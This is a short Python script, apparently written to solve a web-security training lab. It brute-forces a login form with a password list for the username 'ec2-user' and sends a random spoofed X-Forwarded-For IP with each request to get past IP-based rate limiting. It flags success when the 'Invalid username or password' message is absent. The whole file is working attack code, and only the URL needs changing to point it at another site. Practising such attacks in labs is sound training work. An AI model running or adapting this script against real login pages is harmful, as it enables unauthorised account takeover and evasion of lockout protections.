import requests
import re
import random
import time

with open("passwords.txt", "r") as password_file:
    password = [line.strip() for line in password_file]

for i in password:	
	header = {"X-Forwarded-For": str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))}
	data={"username":"ec2-user", "password": i}
	respuesta=requests.post("https://0a5d001b047f242c80518f5200ce0032.web-security-academy.net/login", headers=header, data=data)
	coincidencia=re.findall("Invalid username or password.",respuesta.text)
	if coincidencia == []:
		print("Password encontrado: " + i)
